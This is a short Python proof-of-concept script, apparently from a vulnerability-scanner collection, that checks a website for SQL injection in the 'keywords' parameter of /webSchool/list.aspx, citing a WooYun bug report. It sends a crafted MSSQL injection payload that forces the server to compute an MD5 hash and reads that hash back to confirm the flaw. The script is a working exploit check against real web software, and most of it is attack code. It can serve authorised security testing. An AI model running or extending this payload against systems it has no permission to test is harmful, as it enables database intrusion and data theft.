#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 师友list.aspx keywords SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-082296
author: Lucifer
description: 文件/webSchool/list.aspx中,参数keywords存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['师友list.aspx keywords SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/webSchool/list.aspx?keyWords=1%%27AnD/**/1>Sys.Fn_VarbinTohexstr(HashBytes(%27Md5%27,%271234%27))AnD/**/%27%%27=%27"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
